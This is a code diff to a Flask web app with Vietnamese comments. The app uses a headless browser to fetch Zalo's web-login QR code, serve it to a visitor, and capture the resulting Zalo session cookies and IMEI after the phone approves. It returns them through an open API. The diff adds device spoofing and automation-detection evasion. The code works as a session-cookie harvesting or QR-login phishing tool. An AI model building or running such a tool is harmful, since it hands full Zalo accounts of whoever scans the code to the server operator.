@@ -15,17 +15,20 @@ from flask import Flask, request, jsonify, render_template_string, Response
 
 QR_TTL = 600
 DATA_DIR = "/tmp/qr_sessions"
+CACHE_DIR = "/tmp/zalo_cache"
 os.makedirs(DATA_DIR, exist_ok=True)
+os.makedirs(CACHE_DIR, exist_ok=True)
 
 app = Flask(__name__)
 
 # ============================================================
-# QUẢN LÝ TIẾN TRÌNH TRÌNH DUYỆT ĐƠN (TIẾT KIỆM RAM)
+# SINGLETON BROWSER VỚI DISK CACHE (TẢI QR SIÊU TỐC)
 # ============================================================
 GLOBAL_BROWSER = None
 GLOBAL_PLAYWRIGHT = None
 BROWSER_LOCK = asyncio.Lock()
 ACTIVE_PAGES = {}
+SESSION_EVENTS = {}
 
 
 async def get_shared_browser():
@@ -43,6 +46,7 @@ async def get_shared_browser():
         "--disable-gpu",
         "--renderer-process-limit=1",
         "--disable-blink-features=AutomationControlled",
+        f"--disk-cache-dir={CACHE_DIR}",
         "--window-size=1280,850",
     ]
 
@@ -90,45 +94,43 @@ def gen_imei():
 
 
 # ============================================================
-# ZALO QR CORE ENGINE — DESKTOP FAST CAPTURE & IPHONE 18 PRO MAX
+# ZALO QR CORE ENGINE — IOS 26.1 & DIRECT CANVAS GRABBER
 # ============================================================
 class ZaloQREngine:
-    async def extract_qr_fast(self, page):
-        # 1. Tự động chuyển tab QR nếu Zalo Web đang hiển thị tab số điện thoại
+    async def extract_qr_lightning(self, page):
+        # Tự động kích hoạt tab QR nếu Zalo Web đang hiển thị tab số điện thoại
         try:
-            tab_qr = await page.wait_for_selector("text=/QR|Quét mã/i", timeout=2000)
+            tab_qr = await page.wait_for_selector("text=/QR|Quét mã/i", timeout=1200)
             if tab_qr:
                 await tab_qr.click()
         except Exception:
             pass
 
-        # 2. Định vị trực tiếp thẻ Canvas vẽ mã QR (Bỏ qua hoàn toàn ảnh logo Zalo)
-        js_extract = """
-        () => {
-            // Tìm thẻ canvas của mã QR (Zalo Web dùng canvas để render mã QR)
-            const canvas = document.querySelector('.qrcode canvas') || document.querySelector('.qr-container canvas') || document.querySelector('canvas');
-            if (canvas && canvas.width >= 100 && canvas.height >= 100) {
-                return canvas.toDataURL('image/png');
-            }
-            // Tìm thẻ ảnh bên trong đúng khung chứa mã QR
-            const qrImg = document.querySelector('.qrcode img') || document.querySelector('.qr-wrapper img');
-            if (qrImg && qrImg.src && qrImg.src.startsWith('data:image') && qrImg.width >= 100) {
-                return qrImg.src;
+        # Quét trực tiếp dữ liệu từ Canvas mã QR ngay khi render
+        js_fast_scan = """
+        async () => {
+            for (let i = 0; i < 40; i++) {
+                const canvas = document.querySelector('.qrcode canvas') || document.querySelector('.qr-container canvas') || document.querySelector('canvas');
+                if (canvas && canvas.width >= 100 && canvas.height >= 100) {
+                    return canvas.toDataURL('image/png');
+                }
+                const qrImg = document.querySelector('.qrcode img') || document.querySelector('.qr-wrapper img');
+                if (qrImg && qrImg.src && qrImg.src.startsWith('data:image') && qrImg.width >= 100) {
+                    return qrImg.src;
+                }
+                await new Promise(r => setTimeout(r, 100));
             }
             return null;
         }
         """
+        try:
+            b64 = await page.evaluate(js_fast_scan)
+            if b64:
+                return b64
+        except Exception:
+            pass
 
-        for _ in range(12):
-            try:
-                b64 = await page.evaluate(js_extract)
-                if b64:
-                    return b64
-            except Exception:
-                pass
-            await asyncio.sleep(0.25)
-
-        # 3. Fallback chụp phần tử chứa mã QR nếu không trích xuất được trực tiếp Base64
+        # Fallback chụp phần tử QR nếu canvas không cho xuất trực tiếp
         for sel in [".qrcode canvas", ".qrcode", ".qr-wrapper", "canvas"]:
             try:
                 el = await page.query_selector(sel)
@@ -142,7 +144,7 @@ class ZaloQREngine:
 
         return None
 
-    async def create_qr(self, session_id):
+    async def create_qr(self, session_id, ready_event):
         async with BROWSER_LOCK:
             browser = await get_shared_browser()
             for old_ctx in browser.contexts:
@@ -151,37 +153,39 @@ class ZaloQREngine:
                 except Exception:
                     pass
 
-            # Sử dụng Desktop Viewport & Mac User-Agent để Zalo nhả mã QR tức thì trong 2s
+            # Giả lập hoàn chỉnh nhân Safari trên iOS 26.1 (iPhone 18 Pro Max)
             ctx = await browser.new_context(
                 viewport={"width": 1280, "height": 850},
-                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+                user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
                 locale="vi-VN",
                 timezone_id="Asia/Ho_Chi_Minh",
             )
             page = await ctx.new_page()
 
         try:
-            # Chặn tài nguyên nặng để tăng tốc độ tải
+            # Chặn các tài nguyên không cần thiết để trang mở siêu tốc
             await page.route(
                 "**/*",
                 lambda route: route.abort()
                 if route.request.resource_type in ["media", "font"]
-                or any(t in route.request.url for t in ["google-analytics", "doubleclick", "stats"])
+                or any(t in route.request.url for t in ["google-analytics", "doubleclick", "stats", "tracking"])
                 else route.continue_(),
             )
 
             await page.add_init_script("""
                 Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+                Object.defineProperty(navigator, 'platform', { get: () => 'iPhone' });
+                Object.defineProperty(navigator, 'vendor', { get: () => 'Apple Computer, Inc.' });
                 window.chrome = { runtime: {} };
             """)
 
             try:
-                await page.goto("https://chat.zalo.me/", wait_until="domcontentloaded", timeout=18000)
+                await page.goto("https://chat.zalo.me/", wait_until="domcontentloaded", timeout=15000)
             except Exception as e:
                 if "ERR_ABORTED" not in str(e):
                     raise e
 
-            qr_b64 = await self.extract_qr_fast(page)
+            qr_b64 = await self.extract_qr_lightning(page)
             if not qr_b64:
                 raise Exception("Không thể lấy ảnh mã QR")
 
@@ -192,11 +196,12 @@ class ZaloQREngine:
                 "cookies": None,
                 "compact_cookie": None,
                 "imei": None,
-                "device_name": "iPhone 18 Pro Max",
+                "device_name": "iPhone 18 Pro Max (iOS 26.1)",
                 "qr_version": int(time.time()),
             })
 
             ACTIVE_PAGES[session_id] = {"page": page, "context": ctx}
+            ready_event.set()  # Đánh thức API trả về ngay lập tức
 
             threading.Thread(
                 target=lambda: asyncio.run(self._poll(page, session_id)),
@@ -210,10 +215,11 @@ class ZaloQREngine:
                 "error": str(e),
                 "created_at": time.time(),
             })
+            ready_event.set()
 
     async def _poll(self, page, session_id):
         start = time.time()
-        # Vòng lặp quét nhanh mỗi 0.5s để phát hiện người dùng bấm Đồng ý tức thì
+        # Quét tần số cao mỗi 0.4s để nhận diện ngay khi người dùng nhấn Đồng ý
         while time.time() - start < QR_TTL:
             try:
                 cookies = await page.context.cookies()
@@ -228,7 +234,7 @@ class ZaloQREngine:
             except Exception:
                 pass
 
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.4)
 
         data = sess_load(session_id) or {}
         data["status"] = "expired"
@@ -237,11 +243,11 @@ class ZaloQREngine:
 
     async def _extract(self, session_id, page):
         try:
-            await asyncio.sleep(0.8)
+            await asyncio.sleep(0.6)
             cookies = await page.context.cookies()
             ck_dict = {c["name"]: c["value"] for c in cookies if "zalo" in c.get("domain", "")}
 
-            # Tự động nén và thu gọn cookie thành chuỗi chuẩn name=value;
+            # Nén chuỗi Cookie thu gọn tiêu chuẩn name=value;
             compact_cookie = "; ".join([f"{k}={v}" for k, v in ck_dict.items()])
 
             imei = ""
@@ -264,7 +270,7 @@ class ZaloQREngine:
             data["cookies"] = ck_dict
             data["compact_cookie"] = compact_cookie
             data["imei"] = imei
-            data["device_name"] = "iPhone 18 Pro Max"
+            data["device_name"] = "iPhone 18 Pro Max (iOS 26.1)"
             sess_save(session_id, data)
             await self._cleanup(session_id)
         except Exception as e:
@@ -288,6 +294,8 @@ class ZaloQREngine:
 @app.route("/api/qr/create", methods=["POST"])
 def api_qr_create():
     session_id = uuid.uuid4().hex[:16]
+    ready_event = threading.Event()
+    SESSION_EVENTS[session_id] = ready_event
 
     sess_save(session_id, {
         "status": "creating",
@@ -296,32 +304,25 @@ def api_qr_create():
         "cookies": None,
         "compact_cookie": None,
         "imei": None,
-        "device_name": "iPhone 18 Pro Max",
+        "device_name": "iPhone 18 Pro Max (iOS 26.1)",
         "qr_version": 0,
     })
 
     def run():
         engine = ZaloQREngine()
-        asyncio.run(engine.create_qr(session_id))
+        asyncio.run(engine.create_qr(session_id, ready_event))
 
     threading.Thread(target=run, daemon=True).start()
 
-    # Chờ mã QR tạo xong trong 2-3s để trả về ngay cho giao diện
-    start = time.time()
-    qr_b64 = None
-    while time.time() - start < 15:
-        data = sess_load(session_id)
-        if data and data.get("qr_b64"):
-            qr_b64 = data["qr_b64"]
-            break
-        if data and data.get("status") == "error":
-            break
-        time.sleep(0.2)
+    # Đợi event phát tín hiệu xong (chỉ 1 - 2.5s) để trả ảnh trực tiếp về giao diện
+    ready_event.wait(timeout=12)
+    SESSION_EVENTS.pop(session_id, None)
 
+    data = sess_load(session_id) or {}
     return jsonify({
-        "ok": True,
+        "ok": data.get("status") != "error",
         "session_id": session_id,
-        "qr_b64": qr_b64,
+        "qr_b64": data.get("qr_b64"),
         "qr_url": "/qr/" + session_id,
         "ttl": QR_TTL,
     })
@@ -338,7 +339,7 @@ def api_qr_status(session_id):
         "imei": data.get("imei"),
         "cookies": data.get("cookies"),
         "compact_cookie": data.get("compact_cookie"),
-        "device_name": data.get("device_name", "iPhone 18 Pro Max"),
+        "device_name": data.get("device_name", "iPhone 18 Pro Max (iOS 26.1)"),
         "error": data.get("error"),
         "qr_version": data.get("qr_version", 0),
     })
@@ -355,12 +356,12 @@ def api_qr_refresh(session_id):
 
         async def _refresh():
             page = info["page"]
-            return await engine.extract_qr_fast(page)
+            return await engine.extract_qr_lightning(page)
 
         result = {}
         t = threading.Thread(target=lambda: result.update({"b64": asyncio.run(_refresh())}))
         t.start()
-        t.join(timeout=5)
+        t.join(timeout=4)
 
         b64 = result.get("b64")
         if not b64:
@@ -400,9 +401,9 @@ body {
     min-height:100vh; min-height:100dvh;
     display:flex; align-items:center; justify-content:center;
     background:
-        radial-gradient(circle at 15% 15%, rgba(0, 255, 213, 0.28), transparent 45%),
-        radial-gradient(circle at 85% 85%, rgba(0, 180, 255, 0.28), transparent 45%),
-        radial-gradient(circle at 50% 50%, rgba(20, 25, 35, 0.8), #07090e);
+        radial-gradient(circle at 15% 15%, rgba(0, 255, 213, 0.3), transparent 45%),
+        radial-gradient(circle at 85% 85%, rgba(0, 180, 255, 0.3), transparent 45%),
+        radial-gradient(circle at 50% 50%, rgba(15, 22, 33, 0.85), #06080d);
     background-size:180% 180%;
     animation:liquidShift 14s ease-in-out infinite alternate;
     padding:16px;
@@ -418,15 +419,15 @@ body {
     background:rgba(255, 255, 255, 0.08);
     backdrop-filter:blur(36px) saturate(210%);
     -webkit-backdrop-filter:blur(36px) saturate(210%);
-    padding:36px 26px 32px;
+    padding:36px 24px 32px;
     border-radius:36px;
     border:1.5px solid rgba(255, 255, 255, 0.22);
     box-shadow:
-        0 35px 90px rgba(0, 0, 0, 0.6),
+        0 35px 90px rgba(0, 0, 0, 0.65),
         inset 0 1px 1px rgba(255, 255, 255, 0.6),
-        inset 0 -1px 2px rgba(0, 255, 213, 0.2);
-    text-align:center; max-width:440px; width:100%;
-    animation:cardAppear 0.4s cubic-bezier(0.16,1,0.3,1);
+        inset 0 -1px 2px rgba(0, 255, 213, 0.25);
+    text-align:center; max-width:460px; width:100%;
+    animation:cardAppear 0.35s cubic-bezier(0.16,1,0.3,1);
     overflow:hidden;
 }
 .liquid-card::before {
@@ -441,7 +442,7 @@ body {
     100% { transform:translateX(100%) rotate(20deg); }
 }
 @keyframes cardAppear {
-    from { opacity:0; transform:translateY(20px) scale(0.97); }
+    from { opacity:0; transform:translateY(16px) scale(0.97); }
     to { opacity:1; transform:translateY(0) scale(1); }
 }
 
@@ -462,7 +463,7 @@ h1 {
 }
 p.sub {
     color:rgba(255, 255, 255, 0.8);
-    margin-bottom:24px; font-size:13px; font-weight:500;
+    margin-bottom:22px; font-size:13px; font-weight:500;
 }
 
 /* NÚT BẤM VIÊN THUỐC MÀU TRẮNG TUYẾT */
@@ -554,7 +555,7 @@ HTML_HOME = """<!DOCTYPE html>
     </div>
 
     <h1>MÃ ĐĂNG NHẬP ZALO</h1>
-    <p class="sub">Tạo mã QR siêu tốc & Nhận diện thiết bị iPhone 18 Pro Max</p>
+    <p class="sub">Tạo mã QR tức thì & Định danh iPhone 18 Pro Max (iOS 26.1)</p>
 
     <button id="btn-start" class="btn-pill" onclick="startQR()">
         <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
@@ -566,10 +567,10 @@ HTML_HOME = """<!DOCTYPE html>
     <div class="guide-box">
         <div class="guide-title">
             <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
-            Cơ chế hoạt động
+            Quy trình tức thì
         </div>
-        <div class="guide-item"><span class="guide-badge">1</span> Nhấn Khởi tạo mã QR</div>
-        <div class="guide-item"><span class="guide-badge">2</span> Mã QR tải ngay lập tức trong 2 giây</div>
+        <div class="guide-item"><span class="guide-badge">1</span> Bấm Khởi tạo mã QR</div>
+        <div class="guide-item"><span class="guide-badge">2</span> Mã QR hiển thị to rõ chỉ trong 1 - 2 giây</div>
         <div class="guide-item"><span class="guide-badge">3</span> Điện thoại quét mã & xác nhận đăng nhập</div>
         <div class="guide-item"><span class="guide-badge">4</span> Web tự động chuyển sang trang lấy Cookie & IMEI</div>
     </div>
@@ -579,15 +580,15 @@ HTML_HOME = """<!DOCTYPE html>
 async function startQR() {
     const btn = document.getElementById('btn-start');
     btn.disabled = true;
-    btn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg><span>ĐANG KHỞI TẠO...</span>';
+    btn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg><span>ĐANG TẢI MÃ QR...</span>';
     try {
         const r = await fetch('/api/qr/create', { method: 'POST' });
         const d = await r.json();
         if (d.ok) {
-            btn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg><span>HOÀN TẤT</span>';
-            setTimeout(() => { window.location.href = d.qr_url; }, 150);
+            btn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg><span>SẴN SÀNG</span>';
+            setTimeout(() => { window.location.href = d.qr_url; }, 100);
         } else {
-            alert('Lỗi: ' + (d.error || 'Không rõ nguyên nhân'));
+            alert('Lỗi: ' + (d.error || 'Không rõ'));
             btn.disabled = false;
             btn.innerHTML = '<svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg><span>KHỞI TẠO MÃ QR</span>';
         }
@@ -611,31 +612,34 @@ HTML_QR = """<!DOCTYPE html>
 <title>Xác Thực QR — Liquid Glass</title>
 <style>
 """ + SHARED_CSS + """
+/* KHUNG HIỂN THỊ MÃ QR TO RÕ NÉT (350PX) */
 .qr-frame {
     position:relative;
     background:#ffffff;
-    padding:14px; border-radius:26px;
-    margin:0 auto 14px; max-width:280px; width:100%; min-height:280px;
-    border:2px solid rgba(0, 255, 213, 0.6);
-    box-shadow:0 15px 45px rgba(0, 0, 0, 0.4), 0 0 35px rgba(0, 255, 213, 0.25);
+    padding:16px; border-radius:30px;
+    margin:0 auto 16px; max-width:350px; width:100%; min-height:350px;
+    border:2.5px solid rgba(0, 255, 213, 0.7);
+    box-shadow:
+        0 20px 60px rgba(0, 0, 0, 0.5),
+        0 0 45px rgba(0, 255, 213, 0.35);
     display:flex; align-items:center; justify-content:center;
 }
 .qr-frame img {
-    width:100%; height:auto; display:none; border-radius:14px;
-    object-fit:contain;
+    width:100%; height:auto; display:none; border-radius:18px;
+    object-fit:contain; image-rendering:pixelated;
 }
 .qr-loading {
-    display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px;
-    color:#07202b; font-size:12px; font-weight:800;
+    display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px;
+    color:#06232e; font-size:13px; font-weight:800;
 }
-.qr-loading svg { width:26px; height:26px; stroke:#00b4d8; stroke-width:2.5; fill:none; }
+.qr-loading svg { width:32px; height:32px; stroke:#00b4d8; stroke-width:2.6; fill:none; }
 
 .device-badge {
     display:inline-flex; align-items:center; justify-content:center; gap:6px;
-    font-size:12px; color:#a7ffeb; font-weight:700; margin-bottom:14px;
-    text-shadow:0 1px 8px rgba(0, 255, 213, 0.5);
+    font-size:12px; color:#a7ffeb; font-weight:800; margin-bottom:14px;
+    text-shadow:0 1px 8px rgba(0, 255, 213, 0.6);
 }
-.device-badge svg { width:14px; height:14px; stroke:#a7ffeb; fill:none; stroke-width:2.2; }
+.device-badge svg { width:15px; height:15px; stroke:#a7ffeb; fill:none; stroke-width:2.2; }
 
 .status-badge {
     padding:10px 16px; border-radius:9999px;
@@ -718,13 +722,13 @@ HTML_QR = """<!DOCTYPE html>
         <div class="qr-frame">
             <div id="qr-loading" class="qr-loading">
                 <svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg>
-                <span>Đang tải mã QR...</span>
+                <span>Đang tải mã QR siêu tốc...</span>
             </div>
             <img id="qr-img" alt="Mã QR Zalo">
         </div>
         <div class="device-badge">
             <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-            <span>Thiết bị đăng nhập mục tiêu: iPhone 18 Pro Max</span>
+            <span>Thiết bị đăng nhập mục tiêu: iPhone 18 Pro Max (iOS 26.1)</span>
         </div>
     </div>
 
@@ -757,7 +761,7 @@ function renderQR(src) {
     img.src = src;
 }
 
-// Tự động kiểm tra trạng thái mỗi 600ms để chuyển trang tức thì khi bạn bấm Đồng ý
+// Quét nhanh mỗi 400ms để bắt sự kiện người dùng bấm Đồng ý tức thì
 async function check() {
     if (done) return;
     try {
@@ -898,7 +902,7 @@ function showToast(msg) {
     setTimeout(() => { t.remove(); }, 2000);
 }
 
-setInterval(check, 600);
+setInterval(check, 400);
 check();
 </script>
 </body>
